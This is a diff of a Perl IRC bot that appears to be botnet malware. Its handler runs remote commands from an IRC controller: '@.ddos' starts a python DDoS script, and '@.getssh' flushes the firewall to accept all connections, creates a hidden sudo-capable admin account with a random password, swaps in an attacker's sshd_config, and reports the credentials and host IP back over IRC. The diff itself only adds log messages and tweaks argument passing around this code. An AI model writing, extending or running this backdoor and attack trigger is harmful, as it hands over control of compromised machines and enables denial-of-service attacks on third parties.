@@ -63,14 +63,16 @@ $irc->on(irc_privmsg => sub {
 
  }
  if ($msg =~ /@.ddos/) {
-  system 'python ddos.py ' . "@ARGV"; 
+  system 'python ddos.py ' . @ARGV; 
  }
  if ($msg =~ /@.ddos.stop/) {
   system 'pkill python'; 
  }
   if ($msg =~ /@.getssh/) {
+  warn 'Flushing iptables & Accepting all remote connections.';
 system "sudo iptables -F INPUT";
 system "sudo iptables -P INPUT ACCEPT";
+  warn 'Adding new admin account...';
 $range = 999999999;
 $minimum = 100000000;
 $random_number = int(rand($range)) + $minimum;
@@ -79,11 +81,12 @@ system 'sudo useradd -m ' . $random_user;
 system "echo $random_user:$random_number | sudo chpasswd";
 system 'if [ -f "/usr/bin/yum" ]; then sudo usermod -aG wheel ' . $random_user . '; fi';
 system 'if [ -f "/usr/bin/apt" ]; then sudo adduser ' . $random_user . ' sudo; fi';
+  warn 'Configuring SSH...';
 system 'sudo cp sshd_config /etc/ssh/sshd_config';
 system 'sudo cp sshd_banner /etc/ssh/sshd_banner';
 system 'if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi';
 system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
-  warn 'Getting SSH...';
+  warn 'Getting External IP Address';
   $address = eval { Net::Address::IP::Local->connected_to('perlmaven.com') };
   @arr4y = ('9,1Added admin:', $random_user, 'password:', $random_number, 'on host:', $address);
   warn "@arr4y";
